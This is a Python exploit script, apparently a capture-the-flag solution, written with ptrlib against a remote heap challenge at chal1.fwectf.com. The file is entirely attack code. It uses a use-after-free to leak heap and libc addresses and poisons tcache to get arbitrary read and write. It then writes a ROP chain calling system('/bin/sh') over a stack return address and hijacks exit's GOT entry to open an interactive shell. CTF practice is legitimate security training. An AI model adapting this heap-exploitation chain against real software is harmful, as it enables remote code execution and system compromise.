from ptrlib import *
_elf_path = './chall'
elf = ELF(_elf_path)

# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc.so.6')
# io = Process(_elf_path)
# io = Socket('nc localhost 5000')
io = Socket('nc chal1.fwectf.com 8010')

def malloc(index, size, data):
    io.sendlineafter(b'> ', 1)
    io.sendlineafter(b'Index: ', index)
    io.sendlineafter(b'Size: ', size)
    io.sendlineafter(b'Data: ', data)

def free(index):
    io.sendlineafter(b'> ', 2)
    io.sendlineafter(b'Index: ', index)

def edit(index, data):
    io.sendlineafter(b'> ', 3)
    io.sendlineafter(b'Index: ', index)
    io.sendlineafter(b'Data: ', data)

def show(index):
    io.sendlineafter(b'> ', 4)
    io.sendlineafter(b'Index: ', index)
    return io.recv(0x100)

def exit():
    io.sendlineafter(b'> ', 5)

def aar(addr):
    malloc(0, 0x10, b'victim')
    malloc(1, 0x10, b'dummy')
    free(0)
    heap_addr_bytes = show(0)[:8]
    edit(0, heap_addr_bytes + b'fakekey')
    free(0)
    edit(0, p64(u64(heap_addr_bytes) ^ (addr - 0x28)))
    malloc(0, 0x10, b'nya')
    malloc(2, 0x10, b'')
    return show(2)[0x28:0x30]

def aaw(addr, data, sz=0x30, pad=b'A'*8):
    malloc(0, sz, b'victim')
    malloc(1, sz, b'dummy')
    free(0)
    heap_addr_bytes = show(0)[:8]
    edit(0, heap_addr_bytes + b'fakekey')
    free(0)
    edit(0, p64(u64(heap_addr_bytes) ^ (addr - 8)))
    malloc(0, sz, b'nya')
    malloc(2, sz, pad)
    edit(2, pad + data)

input('> ')

# libc leak
malloc(0, 0x500, b'unsorted')
malloc(1, 0x20, b'C'*8)
free(0)
libc.base = u64(show(0)[:8]) - 0x203b20

stack_addr = u64(aar(libc.symbol('environ')))
# logger.info(hex(stack_addr))

ret_addr = stack_addr - 0x130

input('> ')
payload  = p64(next(libc.gadget('pop rdi; ret')))
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(next(libc.gadget('ret')))
payload += p64(libc.symbol('system')-0x10)
aaw(ret_addr, payload)

# logger.info(hex(elf.got('exit')))
aaw(elf.got('exit'), p64(next(libc.gadget('leave; ret'))), sz=0x40, pad=p64(libc.symbol('__isoc99_scanf')-0x10))
input('> ')

exit()

io.interactive()
